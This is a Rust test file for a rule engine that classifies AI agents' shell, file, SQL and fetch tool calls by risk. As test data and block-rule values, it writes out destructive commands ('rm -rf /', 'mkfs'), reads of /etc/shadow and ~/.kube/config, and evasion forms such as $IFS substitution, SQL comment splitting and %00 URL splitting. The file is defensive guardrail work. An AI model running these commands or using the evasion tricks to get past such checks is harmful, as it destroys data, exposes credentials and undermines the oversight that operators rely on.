        // server_type + mcp_server — rejected.
        p.app_filter = None;
        p.mcp_server = Some("fetch".into());
        assert_matches!(
            validate_field_profile(&p),
            Err(FieldProfileValidationError::ServerTypeScopeExclusive)
        );
    }

    #[test]
    fn precedence_priority_within_same_tier() {
        // Two app-tier profiles both matching cursor-*; lower priority wins.
        let mut a = fp("read_file", "read_file", "path", Normalizer::Path, 50);
        a.id = Some("HIGH".into());
        a.app_filter = Some("cursor-*".into());
        let mut b = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        b.id = Some("LOW".into());
        b.app_filter = Some("cursor-*".into());
        let set = FieldProfileSet::new(vec![b, a]);
        assert_eq!(
            set.lookup("read_file", Some("cursor-x"), None, "path")
                .and_then(|m| m.profile_id),
            Some("HIGH")
        );
    }

    #[test]
    fn literal_index_respects_glob_priority() {
        // Same generic tier, same field. A glob pattern with HIGHER priority
        // (lower number) must win over a literal pattern with lower priority.
        // Regression: the literal-index fast path returns its first hit
        // unconditionally; without comparing against the glob walk the lower-
        // priority literal would shadow the higher-priority glob.
        let mut literal = fp("low_pri", "Bash", "command", Normalizer::Shell, 100);
        literal.id = Some("LITERAL".into());
        let mut glob = fp("high_pri", "B*", "command", Normalizer::Shell, 50);
        glob.id = Some("GLOB".into());
        let set = FieldProfileSet::new(vec![literal, glob]);
        // Glob (priority 50) should win over literal (priority 100).
        assert_eq!(
            set.lookup("Bash", None, None, "command")
                .and_then(|m| m.profile_id),
            Some("GLOB")
        );

        // Inverse: literal at HIGHER priority must win against the glob.
        let mut literal2 = fp("high_pri", "Bash", "command", Normalizer::Shell, 50);
        literal2.id = Some("LITERAL2".into());
        let mut glob2 = fp("low_pri", "B*", "command", Normalizer::Shell, 100);
        glob2.id = Some("GLOB2".into());
        let set2 = FieldProfileSet::new(vec![literal2, glob2]);
        assert_eq!(
            set2.lookup("Bash", None, None, "command")
                .and_then(|m| m.profile_id),
            Some("LITERAL2")
        );
    }

    #[test]
    fn literal_index_case_insensitive() {
        // tool_pattern stored as "Bash"; queries with different casings must
        // all hit the literal index (which keys on lowercased values).
        let set = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        assert!(set.lookup("Bash", None, None, "command").is_some());
        assert!(set.lookup("bash", None, None, "command").is_some());
        assert!(set.lookup("BASH", None, None, "command").is_some());
    }

    #[test]
    fn classify_unclassified_when_no_profile() {
        let rules = vec![classify_rule_for_tool_id("shell_exec", "danger")];
        let set = FieldProfileSet::new(vec![]);
        // Tool name not profiled → tool_id is None → tool_id rule doesn't fire.
        let r = classify_tool_call(&rules, None, None, Some(&set), "weird_tool", None);
        assert_eq!(r.risk, "unknown");
        assert!(r.tool_id.is_none());
        assert!(r.profile_id.is_none());
    }

    #[test]
    fn classify_via_tool_id_rule() {
        let rules = vec![classify_rule_for_tool_id("shell_exec", "caution")];
        let set = FieldProfileSet::new(vec![fp("shell_exec", "Bash", "command", Normalizer::Shell, 100)]);
        let r = classify_tool_call(&rules, None, None, Some(&set), "Bash", None);
        assert_eq!(r.risk, "caution");
        assert_eq!(r.tool_id.as_deref(), Some("shell_exec"));
    }

    #[test]
    fn classify_in_op_matches_array() {
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "tool_id".to_string(),
                op: Op::In,
                value: json!(["read_file", "list_files"]),
            }],
            ..classify_rule_for_tool_id("read_file", "danger")
        };
        let set = FieldProfileSet::new(vec![fp("read_file", "Read", "path", Normalizer::Path, 100)]);
        let r = classify_tool_call(std::slice::from_ref(&rule), None, None, Some(&set), "Read", None);
        assert_eq!(r.risk, "danger");
    }

    #[test]
    fn app_filter_on_rule_gates_evaluation() {
        let mut rule = classify_rule_for_tool_id("shell_exec", "danger");
        rule.app_filter = Some("cursor-*".into());
        let set = FieldProfileSet::new(vec![fp("shell_exec", "Bash", "command", Normalizer::Shell, 100)]);
        // Right app → fires
        assert_eq!(
            classify_tool_call(std::slice::from_ref(&rule), None, Some("cursor-1"), Some(&set), "Bash", None).risk,
            "danger"
        );
        // Wrong app → skipped
        assert_eq!(
            classify_tool_call(std::slice::from_ref(&rule), None, Some("opencode"), Some(&set), "Bash", None).risk,
            "unknown"
        );
    }

    #[test]
    fn validate_tool_id_target_only_accepts_equals_or_in() {
        let mut rule = classify_rule_for_tool_id("shell_exec", "caution");
        // tool_id with glob → rejected
        rule.conditions[0].op = Op::Glob;
        assert_matches!(
            validate(&rule),
            Err(ValidationError::InvalidOpForTarget { .. })
        );
    }

    #[test]
    fn validate_equals_in_only_on_tool_id() {
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "any_arg".to_string(),
                op: Op::Equals,
                value: json!("x"),
            }],
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        assert_matches!(
            validate(&rule),
            Err(ValidationError::InvalidOpForTarget { .. })
        );
    }

    #[test]
    fn validate_rejects_legacy_name_target() {
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "name".to_string(),
                op: Op::Glob,
                value: json!("Bash"),
            }],
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        assert_matches!(
            validate(&rule),
            Err(ValidationError::InvalidTarget { .. })
        );
    }

    /// The bare `arg.` prefix must be refused by `validate`, not merely resolve
    /// to nothing at match time — a stored rule that can never fire is dead
    /// config an operator reads as a guard. The named-field case is asserted
    /// beside it: without it, the same assertion passes if `arg.<f>` stops
    /// validating altogether.
    #[test]
    fn validate_refuses_an_arg_target_that_names_no_field() {
        let arg_rule = |target: &str| Rule {
            conditions: vec![MatchCondition {
                target: target.to_string(),
                op: Op::ContainsAny,
                value: json!(["/etc/shadow"]),
            }],
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        assert_matches!(
            validate(&arg_rule("arg.")),
            Err(ValidationError::InvalidTarget { .. })
        );
        assert_matches!(validate(&arg_rule("arg.path")), Ok(()));
    }

    #[test]
    fn validate_field_profile_rejects_app_filter_and_mcp_server_together() {
        let mut p = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        p.app_filter = Some("cursor-*".into());
        p.mcp_server = Some("filesystem".into());
        assert_matches!(
            validate_field_profile(&p),
            Err(FieldProfileValidationError::AppFilterMcpServerExclusive)
        );
    }

    #[test]
    fn validate_field_profile_rejects_empty_tool_id() {
        let mut p = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        p.tool_id = "".into();
        assert_matches!(
            validate_field_profile(&p),
            Err(FieldProfileValidationError::EmptyToolId)
        );
    }

    #[test]
    fn validate_field_profile_rejects_dotted_tool_id() {
        let mut p = fp("read.file", "read_file", "path", Normalizer::Path, 100);
        p.tool_id = "read.file".into();
        assert_matches!(
            validate_field_profile(&p),
            Err(FieldProfileValidationError::InvalidToolIdChar { ch: '.' })
        );
    }

    #[test]
    fn validate_field_profile_rejects_empty_scope_filters() {
        let base = || fp("read_file", "read_file", "path", Normalizer::Path, 100);
        let cases: [(&'static str, FieldProfile); 4] = [
            ("app_filter", {
                let mut p = base();
                p.app_filter = Some("".into());
                p
            }),
            ("mcp_server", {
                let mut p = base();
                p.mcp_server = Some("   ".into());
                p
            }),
            ("server_type", {
                let mut p = base();
                p.server_type = Some("".into());
                p
            }),
            ("wire_field", {
                let mut p = base();
                p.wire_field = Some("\t  \n".into());
                p
            }),
        ];
        for (field, p) in &cases {
            match validate_field_profile(p) {
                Err(FieldProfileValidationError::EmptyScopeFilter { field: got }) => {
                    assert_eq!(&got, field, "wrong field reported for {field}");
                }
                other => panic!("expected EmptyScopeFilter for {field}, got {other:?}"),
            }
        }
    }

    #[test]
    fn validate_rule_ok_for_canonical_shape() {
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".to_string(),
                    op: Op::Equals,
                    value: json!("shell_exec"),
                },
                MatchCondition {
                    target: "arg.command".to_string(),
                    op: Op::ContainsAny,
                    value: json!(["rm -rf /"]),
                },
            ],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        assert!(validate(&rule).is_ok());
    }

    #[test]
    fn contains_word_any_anchors_on_word_boundaries() {
        // "kill" in "sudo kill -9 1234" — word-boundary match.
        let cond = MatchCondition {
            target: "arg.command".into(),
            op: Op::ContainsWordAny,
            value: json!(["kill", "reboot"]),
        };
        assert!(condition_matches(&cond, "sudo kill -9 1234"));
        assert!(condition_matches(&cond, "please reboot now"));
        // "kill" in "killed" — should NOT match (right side is `e`, a word char).
        assert!(!condition_matches(&cond, "the process was killed"));
        // "reboot" in "rebooted" — same.
        assert!(!condition_matches(&cond, "rebooted"));
        // Case-insensitive.
        assert!(condition_matches(&cond, "Kill -9"));
        // Underscore is a word char — `RM_RF` shouldn't match needle "rm".
        let cond_rm = MatchCondition {
            target: "arg.command".into(),
            op: Op::ContainsWordAny,
            value: json!(["rm"]),
        };
        assert!(!condition_matches(&cond_rm, "RM_RF helper"));
        assert!(condition_matches(&cond_rm, "rm -rf /"));
        // Compare with `contains_any`: it matches "killed" (false positive).
        let cond_loose = MatchCondition {
            target: "arg.command".into(),
            op: Op::ContainsAny,
            value: json!(["kill"]),
        };
        assert!(condition_matches(&cond_loose, "the process was killed"));
    }

    #[test]
    fn replace_action_wholesale_and_regex_and_drop() {
        let act = RuleAction::Replace { regex: None, with: Some("[scrubbed]".into()), drop: false };
        assert_eq!(apply_replacement(&act, "secret"), Some("[scrubbed]".into()));
        let act = RuleAction::Replace { regex: Some("sk-[A-Za-z0-9]+".into()), with: Some("[redacted-key]".into()), drop: false };
        assert_eq!(apply_replacement(&act, "prefix sk-abc123 suffix"), Some("prefix [redacted-key] suffix".into()));
        assert_eq!(apply_replacement(&act, "no key here"), None);
        let act = RuleAction::Replace { regex: Some("anything".into()), with: Some("kept".into()), drop: true };
        assert_eq!(apply_replacement(&act, "anything"), Some(String::new()));
        let act = RuleAction::Replace { regex: None, with: None, drop: false };
        assert_eq!(apply_replacement(&act, "secret"), Some("[redacted]".into()));
    }

    #[test]
    fn end_to_end_one_rule_two_clients() {
        // Cursor profile: read_file tool, target_file wire arg, canonical `path`.
        let mut cursor = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        cursor.app_filter = Some("cursor-*".into());
        cursor.wire_field = Some("target_file".into());
        // OpenCode profile: read tool, filePath wire arg, canonical `path`.
        let mut oc = fp("read_file", "read", "path", Normalizer::Path, 100);
        oc.app_filter = Some("opencode".into());
        oc.wire_field = Some("filePath".into());
        let set = FieldProfileSet::new(vec![cursor, oc]);

        // ONE rule covers both clients via tool_id + canonical arg.path.
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".to_string(),
                    op: Op::Equals,
                    value: json!("read_file"),
                },
                MatchCondition {
                    target: "arg.path".to_string(),
                    op: Op::Glob,
                    value: json!("/etc/*"),
                },
            ],
            ..classify_rule_for_tool_id("read_file", "danger")
        };
        let rules = vec![rule];

        // Cursor call → fires
        let cursor_args = json!({"target_file": "/etc/passwd"});
        let r1 = classify_tool_call(&rules, None, Some("cursor-1"), Some(&set), "read_file", Some(&cursor_args));
        assert_eq!(r1.risk, "danger", "cursor: {r1:?}");

        // OpenCode call → SAME rule fires
        let oc_args = json!({"filePath": "/etc/shadow"});
        let r2 = classify_tool_call(&rules, None, Some("opencode"), Some(&set), "read", Some(&oc_args));
        assert_eq!(r2.risk, "danger", "opencode: {r2:?}");

        // Neither client matches a /home call
        let safe = json!({"target_file": "/home/user/x"});
        let r3 = classify_tool_call(&rules, None, Some("cursor-1"), Some(&set), "read_file", Some(&safe));
        assert_eq!(r3.risk, "unknown");
    }

    #[test]
    fn shell_normaliser_defeats_obfuscation_via_canonical_field() {
        let set = FieldProfileSet::new(vec![fp("shell_exec", "Bash", "command", Normalizer::Shell, 100)]);
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".to_string(),
                    op: Op::Equals,
                    value: json!("shell_exec"),
                },
                MatchCondition {
                    target: "arg.command".to_string(),
                    op: Op::ContainsAny,
                    value: json!(["rm -rf /tmp/x"]),
                },
            ],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let args = json!({"command": "rm   -rf   /tmp/x"});
        let r = classify_tool_call(std::slice::from_ref(&rule), None, None, Some(&set), "Bash", Some(&args));
        assert_eq!(r.risk, "danger");
    }

    #[test]
    fn shell_normaliser_defeats_dollar_ifs_evasion() {
        // Operator writes a rule against `rm -rf /tmp`; LLM emits the IFS
        // bypass `rm$IFS-rf$IFS/tmp`. The shell normaliser pre-expands $IFS
        // before tokenising, so the canonical `rm -rf /tmp` matches.
        let set = FieldProfileSet::new(vec![fp("shell_exec", "Bash", "command", Normalizer::Shell, 100)]);
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".into(),
                    op: Op::Equals,
                    value: json!("shell_exec"),
                },
                MatchCondition {
                    target: "arg.command".into(),
                    op: Op::ContainsAny,
                    value: json!(["rm -rf /tmp"]),
                },
            ],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let args = json!({"command": "rm$IFS-rf$IFS/tmp"});
        let r = classify_tool_call(std::slice::from_ref(&rule), None, None, Some(&set), "Bash", Some(&args));
        assert_eq!(r.risk, "danger", "IFS evasion should not bypass: {r:?}");
    }

    /// `%00` decodes to the form separator itself. Joined, the canonical value
    /// would read as two forms the normaliser never produced, and a needle
    /// spanning the cut would match neither — a `block` rule that stores,
    /// displays and never fires. The clean spelling and a non-matching URL are
    /// here as the controls: without them this passes with matching broken.
    #[test]
    fn a_percent_encoded_nul_cannot_split_a_url_rule() {
        let set = FieldProfileSet::new(vec![fp(
            "web_fetch",
            "Fetch",
            "url",
            Normalizer::Url,
            100,
        )]);
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "arg.url".into(),
                op: Op::ContainsAny,
                value: json!(["evil.com/path"]),
            }],
            ..classify_rule_for_tool_id("web_fetch", "danger")
        };
        let risk_of = |url: &str| {
            let args = json!({ "url": url });
            classify_tool_call(
                std::slice::from_ref(&rule),
                None,
                None,
                Some(&set),
                "Fetch",
                Some(&args),
            )
            .risk
        };
        for spelling in [
            "https://evil.com/path",
            "https://evil.com/pa%00th",
            "https://evil.com/pa\u{0}th",
            "https://evil.com/%00path",
        ] {
            assert_eq!(risk_of(spelling), "danger", "rule bypassed by {spelling:?}");
        }
        assert_ne!(risk_of("https://good.example/other"), "danger");
    }

    #[test]
    fn sql_normaliser_defeats_intra_keyword_comment_split() {
        // `DR/**/OP TABLE` — empty-replace form puts `drop` back together;
        // matcher any-matches across the forms the normaliser returned.
        let set = FieldProfileSet::new(vec![fp("sql_exec", "Query", "query", Normalizer::Sql, 100)]);
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".into(),
                    op: Op::Equals,
                    value: json!("sql_exec"),
                },
                MatchCondition {
                    target: "arg.query".into(),
                    op: Op::ContainsAny,
                    value: json!(["drop table"]),
                },
            ],
            ..classify_rule_for_tool_id("sql_exec", "danger")
        };
        // Attached comment: empty-replace → `droptable`, space-replace →
        // `drop table`. Rule matches the space-form.
        let args = json!({"query": "DROP/**/TABLE users"});
        let r = classify_tool_call(std::slice::from_ref(&rule), None, None, Some(&set), "Query", Some(&args));
        assert_eq!(r.risk, "danger", "attached-comment evasion should not bypass: {r:?}");

        // Intra-keyword split: empty-replace → `drop table users`,
        // space-replace → `dr op table users`. Rule matches empty form.
        let args2 = json!({"query": "DR/**/OP TABLE users"});
        let r2 = classify_tool_call(std::slice::from_ref(&rule), None, None, Some(&set), "Query", Some(&args2));
        assert_eq!(r2.risk, "danger", "intra-keyword evasion should not bypass: {r2:?}");
    }

    #[test]
    fn mcp_namespace_routes_to_mcp_profile() {
        let mut p = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        p.mcp_server = Some("filesystem".into());
        p.id = Some("MCP-FS-READ".into());
        let set = FieldProfileSet::new(vec![p]);

        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".to_string(),
                    op: Op::Equals,
                    value: json!("read_file"),
                },
                MatchCondition {
                    target: "arg.path".to_string(),
                    op: Op::Glob,
                    value: json!("/etc/*"),
                },
            ],
            ..classify_rule_for_tool_id("read_file", "danger")
        };

        let args = json!({"path": "/etc/passwd"});
        let r = classify_tool_call(
            std::slice::from_ref(&rule),
            None,
            None,
            Some(&set),
            "mcp__filesystem__read_file",
            Some(&args),
        );
        assert_eq!(r.risk, "danger");
        assert_eq!(r.profile_id.as_deref(), Some("MCP-FS-READ"));
    }

    // ─── any_arg target ──────────────────────────────────────────────

    #[test]
    fn any_arg_returns_none_for_unprofiled_tool() {
        let set = FieldProfileSet::new(vec![]);
        let args = json!({"command": "rm -rf /tmp/x"});
        let got = resolve_any_canonical_arg(Some(&args), Some(&set), "weird_tool", None, None);
        assert!(got.is_none(), "unprofiled tool must return None, got: {got:?}");
    }

    #[test]
    fn any_arg_returns_normalised_value_for_single_field_tool() {
        let set = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let args = json!({"command": "rm -rf /etc/shadow"});
        let got = resolve_any_canonical_arg(Some(&args), Some(&set), "Bash", None, None)
            .expect("profile matched")
            .join(" ");
        assert!(got.contains("rm"), "value present, got: {got}");
        assert!(got.contains("/etc/shadow"));
    }

    #[test]
    fn any_arg_joins_multiple_canonical_fields_across_tools() {
        // Two distinct tools with distinct canonical fields (command vs path).
        // The OR-across-fields property is exercised at the rule level: one
        // rule with tool_id IN [shell_exec, read_file] + any_arg contains_any
        // ".kube/config" fires on both tools.
        let set = FieldProfileSet::new(vec![
            fp("shell_exec", "Bash", "command", Normalizer::Shell, 100),
            fp("read_file", "Read", "path", Normalizer::Path, 100),
        ]);

        // Shell call carrying the target string in `command`.
        let args = json!({"command": "cat ~/.kube/config"});
        let got = resolve_any_canonical_arg(Some(&args), Some(&set), "Bash", None, None)
            .expect("profile matched")
            .join(" ");
        assert!(got.contains(".kube/config"), "value present, got: {got}");

        // Read call carrying the target string in `path`.
        let args = json!({"path": "/home/u/.kube/config"});
        let got = resolve_any_canonical_arg(Some(&args), Some(&set), "Read", None, None)
            .expect("profile matched")
            .join(" ");
        assert!(got.contains(".kube/config"), "value present, got: {got}");
    }

    #[test]
    fn any_arg_skips_fields_missing_from_arguments() {
        // A tool with two registered fields where only one is present in
        // arguments — the resolver returns the present one and doesn't
        // synthesise the missing field.
        let mut p1 = fp("send_email", "send_email", "to", Normalizer::Raw, 100);
        p1.id = Some("EMAIL-TO".into());
        let mut p2 = fp("send_email", "send_email", "subject", Normalizer::Raw, 100);
        p2.id = Some("EMAIL-SUBJECT".into());
        let set = FieldProfileSet::new(vec![p1, p2]);

        let args = json!({"to": "user@example.com"}); // no `subject`
        let got = resolve_any_canonical_arg(
            Some(&args),
            Some(&set),
            "send_email",
            None,
            None,
        )
        .expect("profile matched on `to`")
        .join(" ");
        assert!(got.contains("user@example.com"));
    }

    #[test]
    fn any_arg_rule_matches_via_evaluator_or_across_fields() {
        // End-to-end: classify_tool_call with a `tool_id IN [...]` + `any_arg
        // contains_any [".kube/config"]` rule fires for both shell and read
        // tools — the same OR-across-fields semantics the seeds rely on.
        let set = FieldProfileSet::new(vec![
            fp("shell_exec", "Bash", "command", Normalizer::Shell, 100),
            fp("read_file", "Read", "path", Normalizer::Path, 100),
        ]);
        let rule = Rule {
            conditions: vec![
                MatchCondition {
                    target: "tool_id".to_string(),
                    op: Op::In,
                    value: json!(["shell_exec", "read_file"]),
                },
                MatchCondition {
                    target: "any_arg".to_string(),
                    op: Op::ContainsAny,
                    value: json!([".kube/config"]),
                },
            ],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let args_sh = json!({"command": "cat ~/.kube/config"});
        let r = classify_tool_call(
            std::slice::from_ref(&rule),
            None,
            None,
            Some(&set),
            "Bash",
            Some(&args_sh),
        );
        assert_eq!(r.risk, "danger");
        let args_rd = json!({"path": "/home/u/.kube/config"});
        let r = classify_tool_call(
            std::slice::from_ref(&rule),
            None,
            None,
            Some(&set),
            "Read",
            Some(&args_rd),
        );
        assert_eq!(r.risk, "danger");
        // Same rule must NOT fire when neither field carries the needle.
        let args_other = json!({"command": "ls -la"});
        let r = classify_tool_call(
            std::slice::from_ref(&rule),
            None,
            None,
            Some(&set),
            "Bash",
            Some(&args_other),
        );
        assert_eq!(r.risk, "unknown");
    }

    // ── argv / argv[n] targets ────────────────────────────────────────────

    /// Resolve an argv target against a `Bash`-shaped call, returning the
    /// individual forms the evaluator will OR across.
    fn argv_forms(command: &str, target: &str) -> Vec<String> {
        let set = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let args = json!({ "command": command });
        let resolver = ToolCallResolver {
            name: "Bash",
            arguments: Some(&args),
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
            tool_id: Some("shell_exec"),
        };
        resolver.resolve(target).unwrap_or_default()
    }

    #[test]
    fn argv_index_resolves_the_token_at_that_position() {
        assert_eq!(argv_forms("rm -rf /tmp/x", "argv[0]"), vec!["rm"]);
        assert_eq!(argv_forms("rm -rf /tmp/x", "argv[1]"), vec!["-rf"]);
        // Past the end of the command: nothing to match, condition fails.
        assert!(argv_forms("rm", "argv[5]").is_empty());
    }

    #[test]
    fn argv_bare_target_lists_every_token() {
        let mut forms = argv_forms("rm -rf /tmp/x", "argv");
        forms.sort();
        assert_eq!(forms, vec!["-rf", "/tmp/x", "rm"]);
    }

    /// The point of the target: naming the command must not be dodgeable by
    /// chaining another one in front of it or wrapping it.
    #[test]
    fn argv_index_zero_covers_chained_and_wrapped_commands() {
        for command in [
            "rm -rf /",
            "echo hi; rm -rf /",
            "echo hi && rm -rf /",
            "cat f | rm -rf /",
            "sudo rm -rf /",
            "sudo -u root rm -rf /",
            "env FOO=1 rm -rf /",
            "bash -c 'rm -rf /'",
            "echo hi; sudo bash -c 'rm -rf /'",
        ] {
            assert!(
                argv_forms(command, "argv[0]").contains(&"rm".to_string()),
                "argv[0] missed the command in: {command}"
            );
        }
    }

    /// argv is a property of a command line, so it reads only fields a profile
    /// declared as `shell`. A tool with none resolves to nothing rather than
    /// tokenising something that was never a command.
    #[test]
    fn argv_is_none_without_a_shell_normalised_field() {
        let set = FieldProfileSet::new(vec![fp(
            "read_file",
            "Read",
            "path",
            Normalizer::Path,
            100,
        )]);
        let args = json!({ "path": "/etc/passwd" });
        let resolver = ToolCallResolver {
            name: "Read",
            arguments: Some(&args),
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
            tool_id: Some("read_file"),
        };
        assert_eq!(resolver.resolve("argv[0]"), None);
        assert_eq!(resolver.resolve("argv"), None);
    }

    /// End to end through the evaluator: the documented shape of the target.
    #[test]
    fn argv_index_zero_in_list_blocks_the_named_commands() {
        let set = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "argv[0]".to_string(),
                op: Op::In,
                value: json!(["rm", "shutdown", "mkfs"]),
            }],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        for command in ["rm -rf /", "echo ok; sudo rm -rf /", "mkfs /dev/sda"] {
            let args = json!({ "command": command });
            let r = classify_tool_call(
                std::slice::from_ref(&rule),
                None,
                None,
                Some(&set),
                "Bash",
                Some(&args),
            );
            assert_eq!(r.risk, "danger", "rule did not fire for: {command}");
        }
        // A command merely mentioning one of the names is not one of them —
        // this is what an exact token match buys over a substring scan. The
        // same exactness is the target's sharp edge: `mkfs.ext4` is a
        // different token from `mkfs`, so covering a family needs a glob.
        for command in [
            "ls -la /tmp/rm",
            "echo rm",
            "git rm --cached f",
            "mkfs.ext4 /dev/sda",
        ] {
            let args = json!({ "command": command });
            let r = classify_tool_call(
                std::slice::from_ref(&rule),
                None,
                None,
                Some(&set),
                "Bash",
                Some(&args),
            );
            assert_eq!(r.risk, "unknown", "false positive for: {command}");
        }
        // …and a glob on the same target is how a family is covered.
        let family = Rule {
            conditions: vec![MatchCondition {
                target: "argv[0]".to_string(),
                op: Op::Glob,
                value: json!("mkfs*"),
            }],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let args = json!({ "command": "mkfs.ext4 /dev/sda" });
        let r = classify_tool_call(
            std::slice::from_ref(&family),
            None,
            None,
            Some(&set),
            "Bash",
            Some(&args),
        );
        assert_eq!(r.risk, "danger");
    }

    #[test]
    fn validate_accepts_argv_targets_and_their_exact_match_ops() {
        let mk = |phase: Phase, scope: Scope, target: &str, op: Op| Rule {
            conditions: vec![MatchCondition {
                target: target.to_string(),
                op,
                value: json!(["needle"]),
            }],
            phase,
            scope,
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        for (scope, phase) in [
            (Scope::ToolCalls, Phase::Response),
            (Scope::ToolResults, Phase::Request),
        ] {
            for target in ["argv", "argv[0]", "argv[12]"] {
                let mut r = mk(phase, scope, target, Op::In);
                r.conditions[0].value = json!(["rm"]);
                r.action = RuleAction::Classify;
                assert!(
                    validate(&r).is_ok(),
                    "{target} rejected on {scope:?}: {:?}",
                    validate(&r)
                );
            }
            // Every other op stays available — a token is still a string.
            let mut g = mk(phase, scope, "argv[0]", Op::Glob);
            g.conditions[0].value = json!("*sh");
            g.action = RuleAction::Classify;
            assert!(validate(&g).is_ok(), "glob rejected: {:?}", validate(&g));
        }
    }

    #[test]
    fn validate_rejects_malformed_argv_indices_and_foreign_scopes() {
        let mk = |phase: Phase, scope: Scope, target: &str, op: Op| Rule {
            conditions: vec![MatchCondition {
                target: target.to_string(),
                op,
                value: json!(["needle"]),
            }],
            phase,
            scope,
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        for target in ["argv[]", "argv[-1]", "argv[abc]", "argv[0x2]", "argv[ 0 ]"] {
            let mut r = mk(Phase::Response, Scope::ToolCalls, target, Op::In);
            r.conditions[0].value = json!(["rm"]);
            assert_matches!(
                validate(&r),
                Err(ValidationError::InvalidTarget { .. }),
                "{target} should not be a valid target"
            );
        }
        // An index too large for `usize` is malformed, not a silent no-match.
        let mut overflow = mk(
            Phase::Response,
            Scope::ToolCalls,
            "argv[99999999999999999999999]",
            Op::In,
        );
        overflow.conditions[0].value = json!(["rm"]);
        assert_matches!(
            validate(&overflow),
            Err(ValidationError::InvalidTarget { .. })
        );
        // argv is a tool-argument axis; the resource and prompt scopes have no
        // command line to tokenise.
        let mut foreign = mk(Phase::Request, Scope::PromptInvocations, "argv[0]", Op::In);
        foreign.conditions[0].value = json!(["rm"]);
        assert_matches!(
            validate(&foreign),
            Err(ValidationError::InvalidTarget { .. })
        );
    }

    #[test]
    fn any_arg_higher_tier_shadows_generic_for_same_field() {
        // Both a generic and an mcp-scoped profile register `field=path` for
        // the same tool. The mcp-tier profile must win for `any_arg`.
        let mut generic = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        generic.id = Some("GEN-READ".into());
        let mut mcp = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        mcp.id = Some("MCP-FS-READ".into());
        mcp.mcp_server = Some("filesystem".into());
        let set = FieldProfileSet::new(vec![generic, mcp]);
        let matches = set.lookup_all_fields("read_file", None, Some("filesystem"));
        assert_eq!(matches.len(), 1, "one canonical field, one match");
        assert_eq!(matches[0].0, "path");
        assert_eq!(matches[0].1.profile_id, Some("MCP-FS-READ"));
    }

    #[test]
    fn validate_any_arg_target_accepted_for_tool_calls_and_results() {
        // `(phase, scope)` is constrained by the action matrix: `tool_calls`
        // ships on `response`, `tool_results` ships on `request`. Pick the
        // valid phase per scope so we exercise the target-validation path,
        // not the scope×action path.
        let mk = |phase: Phase, scope: Scope, target: &str, op: Op| Rule {
            conditions: vec![MatchCondition {
                target: target.to_string(),
                op,
                value: json!(["needle"]),
            }],
            phase,
            scope,
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        // contains_any on any_arg in both scopes — valid.
        assert!(
            validate(&mk(Phase::Response, Scope::ToolCalls, "any_arg", Op::ContainsAny))
                .is_ok()
        );
        assert!(
            validate(&mk(Phase::Request, Scope::ToolResults, "any_arg", Op::ContainsAny))
                .is_ok()
        );
        // equals / in on any_arg — rejected (reserved for canonical ids).
        let mut r = mk(Phase::Response, Scope::ToolCalls, "any_arg", Op::Equals);
        r.conditions[0].value = json!("x");
        assert_matches!(
            validate(&r),
            Err(ValidationError::InvalidOpForTarget { .. })
        );
        let r = mk(Phase::Response, Scope::ToolCalls, "any_arg", Op::In);
        assert_matches!(
            validate(&r),
            Err(ValidationError::InvalidOpForTarget { .. })
        );
        // any_arg in tool_definitions / resource_reads / prompt_invocations — rejected.
        assert_matches!(
            validate(&mk(
                Phase::Request,
                Scope::ToolDefinitions,
                "any_arg",
                Op::ContainsAny
            )),
            Err(ValidationError::InvalidTarget { .. })
        );
        assert_matches!(
            validate(&mk(
                Phase::Request,
                Scope::ResourceReads,
                "any_arg",
                Op::ContainsAny
            )),
            Err(ValidationError::InvalidTarget { .. })
        );
        assert_matches!(
            validate(&mk(
                Phase::Request,
                Scope::PromptInvocations,
                "any_arg",
                Op::ContainsAny
            )),
            Err(ValidationError::InvalidTarget { .. })
        );
    }

    #[test]
    fn validate_legacy_args_target_rejected() {
        // Stage D: the raw-JSON `args` escape hatch is gone. Any rule still
        // carrying `target: "args"` (e.g. a seed not yet migrated, an
        // operator-saved custom rule, or a stale agent suggestion) must be
        // rejected at validation time so it surfaces as an explicit
        // upgrade-required error rather than silently never matching.
        let rule = Rule {
            conditions: vec![MatchCondition {
                target: "args".to_string(),
                op: Op::ContainsAny,
                value: json!(["secret"]),
            }],
            ..classify_rule_for_tool_id("shell_exec", "caution")
        };
        assert_matches!(
            validate(&rule),
            Err(ValidationError::InvalidTarget { .. })
        );
    }

